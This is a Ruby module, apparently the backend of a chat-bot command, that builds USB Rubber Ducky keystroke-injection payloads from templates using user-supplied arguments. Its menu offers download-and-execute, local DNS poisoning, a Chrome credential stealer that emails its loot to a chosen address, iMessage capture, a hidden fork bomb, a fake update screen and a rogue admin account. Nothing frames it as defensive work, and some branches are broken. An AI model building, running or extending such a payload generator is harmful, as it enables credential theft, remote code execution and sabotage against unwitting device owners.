require 'colorize'
module Ducky
    class << self
        def Options(num, options, uid)
            case num
            when "1"
                # DownloadAndExecute
                url      = options[1]
                fileName = options[0]
                # checks if its nil
                # if it is not, returns example
                if url.nil? or  fileName.nil?
                    return "example:```.ducky 1; 127.0.0.1; file;```"
                end
                DownloadAndExecute(url, fileName, uid)
            when "2"
                ShutDownWin10(uid)
            when "3"
                site = options[1]
                ip   = options[2]
                if site.nil? or ip.nil? 
                    return "example: ``` .ducky 3; site; ip;```"
                end
                LocalDNSPoison(site, ip, uid)
            when "4"
                Ducky.Android5xUnlock(uid)
            when "5"
                Ducky.Win7LogOff(uid)
            when "6"
                email = options[1]
                toEmail = options[2]
                if email.nil? or toEmail.nil? 
                    return "Example:  ``` .ducky 6; email, toEmail;```"
               end
               Ducky.ChromeStealer(uid, email, toEmail)
               
            when "7"
                channelId = options[1]
                if channelId.nil? 
                    return "example: ```.ducky 7; channelId;```"
                end
                Ducky.YoutubeSub(uid, channelId)
            when "8"
                site = options[1]
                if site.nil?
                    return "Example: ```.ducky 8; site;```"
                end
                Ducky.ChromeHomePage(uid, site)
            when "9"
                Ducky.InvisibleForkBomb(uid)
            when "10"
                Ducky.OSXWgetAndExecute(uid)
            when "11"
                Ducky.OsxIMessageCapature(uid)
            when "12"
                Ducky.FakeUpdateScreen(uid)
            when "13"
                Ducky.RickRolll(uid)
            when "14"
                Ducky.Xmas(uid)
            when "15"
                Ducky.anti_browser(uid)
            when "16"
                acc_name    = options[1]
                acc_pass    = options[0]
                # checks if its nil
                # if it is not, returns example
                if acc_pass.nil? or  acc_name.nil?
                    return "example:```.ducky 16; username; pass;```"
                end
            end
        end
        def DuckyList()
            a =  %Q(
                    1 ] Download and Execute
                    2 ] ShutDown Winodws 10
                    3 ] Local DNS Poison
                    4 ] Androud Unlocked
                    5 ] Win7 Log Off
                    6 ] Chrome Stealer
                    7 ] YouTubeSub
                    8 ] Chrome Home Page
                    9 ] InvisibleForkBomb
                    10] OSX Wget and Execute
                    11] OXSImessageCapature
                    12] Fake Update Screen
                    13] Rick Roll
                    14] Xmas PayLoad
                    15] Anti Browser
                    16] Add Admin
                    )
        end
        def win_add_admin(uid, acc_name, acc_pass)
            f = File.read("lib/scripts/16.txt")
            main = f.gsub("ADMIN", acc_name.to_s).gsub("admin", acc_pass.to_s)
            fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
                a << main
            end
        end
        def anti_browser(uid)
            f = File.read("lib/script/15.txt")
            fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
                a << f
            end
        end
        def Xmas(uid)
            f = File.read("lib/scripts/14.txt")
            fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
                a << f
            end
        end
        def RickRolll(uid)
            f = File.read("lib/scripts/13.txt")
            fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
                a << f
            end
        end
        def FakeUpdateScreen(uid)
            f = File.read("lib/scripts/12.txt")
            fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
                a << f
            end
        end
        def OsxIMessageCapature(uid)
            f = File.read("lib/scripts/11.txt")
            fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
                a << f
            end
        end
        def OSXWgetAndExecute(uid)
            f = File.read("lib/scripts/10.txt")
            fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
                a << f
            end
        end
        def InvisibleForkBomb(uid)
            f = File.read("lib/scripts/9.txt")
            fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
                a << f
            end
        end
        def ChromeHomePage(uid, site)
            f = File.read("lib/scripts/8.txt")
		    main = f.gsub("www.pornhub.com", site.to_s)
            fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
                a << main
            end
        end
        def YoutubeSub(uid, channelId)
            f = File.read("lib/scripts/7.txt")
		    main = f.gsub("YOUR CHANNEL ID", channelId.to_s)
            fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
                a << main
            end
            
        end
        def ChromeStealer(uid, email, toEmail)
            f = File.read("lib/scripts/6.txt")
		    main = f.gsub("youremail@gmail.com", email.strip).gsub("toemail@gmail.com", toEmail.strip)
            fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
                a << main
            end
        end
        def Win7LogOff(uid)
            f = File.read("lib/scripts/5.txt")
            fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
                a << f
            end
        end
        def Android5xUnlock(uid)
            f = File.read("lib/scripts/4.txt")
            fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
                a << f
            end
        end
        def LocalDNSPoison(site, ip, uid)
            f = File.read("lib/scripts/3.txt")
		    main = f.gsub("10.0.0.1", ip.to_s).gsub("ADMIN.COM", site.to_s)
            fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
                a << main
            end
        end
        def DownloadAndExecute(url, fileName, uid)
            # 1
            f = File.read("lib/scripts/1.txt")
		    main = f.gsub("abc.exe", url.strip.to_s).gsub("mess1.exe",fileName.to_s)
            fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
                a << main
            end
        end
        def ShutDownWin10(uid)
            # 2
            f = File.read("lib/scripts/2.txt")
            fileWrite = File.open("lib/done/" + uid + ".txt", "w") do |a|
                a << f
            end
        end
    end
end
